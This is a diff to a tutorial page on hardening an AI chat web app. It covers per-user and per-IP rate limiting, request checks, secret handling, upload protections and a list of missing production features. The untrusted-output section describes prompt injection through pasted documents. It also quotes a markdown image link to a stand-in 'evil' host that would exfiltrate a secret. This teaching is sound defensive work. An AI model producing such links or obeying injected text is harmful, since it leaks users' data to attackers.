@@ -21,7 +21,7 @@ Allowing each client only N requests per time window, and answering the rest wit
 ```python src="AI/app/core/limits.py" fn="SlidingWindowLimiter"
 ```
 
-For each key (the client IP) it keeps a `deque` of recent hit times. Old hits fall off the left side; if the remaining count has reached the limit, it returns *how many seconds until a slot frees up*. The clock is **injected**, which is what makes it testable without waiting. Here it is, with a fake clock you control:
+For each key it keeps a `deque` of recent hit times. The key is a **user id** for chat messages and uploads (so one noisy account cannot lock out the others, and changing IP does not dodge the limit) and the **client IP** for sign-in attempts (there is no user yet). Old hits fall off the left side; if the remaining count has reached the limit, it returns *how many seconds until a slot frees up*. The clock is **injected**, which is what makes it testable without waiting. Here it is, with a fake clock you control:
 
 ```python run include="AI/app/core/limits.py:SlidingWindowLimiter" title="The real rate limiter, with a fake clock" level=medium
 now = [0.0]
@@ -58,8 +58,9 @@ All the checks a chat request must pass **before any model money is spent** are 
 
 | Check | Status | Why |
 |---|---|---|
-| rate limit | **429** + `Retry-After` | abuse and cost |
-| chat exists | **404** | no orphan messages |
+| valid login (a dependency, before this function) | **401** | no token, no access |
+| rate limit (per user) | **429** + `Retry-After` | abuse and cost |
+| chat exists *and is yours* | **404** | no orphan messages; other people's chats look nonexistent |
 | empty text | **422** | nothing to answer |
 | too long (`MAX_MESSAGE_CHARS`) | **413** | cost, context overflow, denial of service |
 | a reply is already streaming | **409** | see below |
@@ -96,7 +97,7 @@ The app has no default model *on purpose*, so it never silently picks a model (a
 
 ## Secrets
 
-- The OpenAI and Tavily keys exist only on the server, loaded from `.env`, which is **git-ignored**. A real environment variable beats the `.env` file, which is how deployments inject secrets.
+- The OpenAI and Tavily keys, and the **`JWT_SECRET`** that signs login tokens, exist only on the server, loaded from `.env`, which is **git-ignored**. A real environment variable beats the `.env` file, which is how deployments inject secrets.
 - Anything in a frontend bundle (`VITE_*` variables included) is **public**. The browser never receives a key.
 - The history of the public repository was scanned for key patterns before it was pushed.
 
@@ -104,13 +105,18 @@ The app has no default model *on purpose*, so it never silently picks a model (a
 
 The model's output is **untrusted**: it can be steered by whatever it read, including a malicious pasted document or web page. So the client renders it defensively. It is covered in the next lesson, but in one line: Markdown becomes React elements (never `dangerouslySetInnerHTML`), raw HTML is shown as inert text, images are removed (a rendered `![](https://evil/?q=<secret>)` would make *your browser* leak data), and links open with `rel="noopener noreferrer"`.
 
+## Accounts and uploads have their own protections
+
+Two newer features add new ways to be attacked, and each got its own lessons rather than a bullet here: **login** (hashed passwords, signed tokens, vague errors and equal timing, every query filtered by owner: [Accounts and login](#/l/login-and-jwt)) and **file uploads** (layered size caps, content checks, zip-bomb guards, safe error messages, background indexing: [The upload pipeline](#/l/the-upload-pipeline)). The shared theme with everything above: validate before spending, say little to the outside, and make the database the judge of what is allowed.
+
 ## What is not here: an honest list
 
 | Missing for real production | Why it matters |
 |---|---|
-| **Authentication and per-user data** | today anyone who can reach the API sees every conversation |
-| **PostgreSQL** instead of one SQLite file | many writers, replication, migrations (Alembic) |
+| **Revocable sessions** (refresh tokens, `httpOnly` cookie), email verification, password reset | a 7-day JWT cannot be cancelled early, and `localStorage` is readable by injected scripts |
+| **Row-level security and database roles** | a second line of defence behind the `user_id` filters in every query |
 | **Shared rate-limit store** (Redis) and per-user budgets | limits that hold across processes and users |
+| **Indexing in a worker queue, and OCR** | a restart interrupts indexing today (the file is marked failed), and scanned PDFs cannot be read |
 | **Spend alerts and a search/loop ceiling** | an uncapped agent loop can run up a bill |
 | **Observability** (traces, metrics, alerts) | know about slowness and errors before users do |
 | **Resumable streams** | a dropped connection currently loses the live stream (the saved partial text remains) |
@@ -125,7 +131,8 @@ Knowing and stating this list is part of the engineering. A project that claims 
 - **CORS** is explicit; dev allows any localhost port, production lists exact origins.
 - **Safe errors** for users, details in the server log, and **no conversation text in logs**.
 - **Fail fast** on bad configuration, with a message that says what to fix. **Secrets** stay on the server.
-- Treat model output and tool output as **untrusted**.
+- Treat model output, tool output and **uploaded documents** as **untrusted**.
+- Rate limit **per user** where you know the user, per IP where you do not.
 - Know what is **missing** for production, and say so.
 :::
 
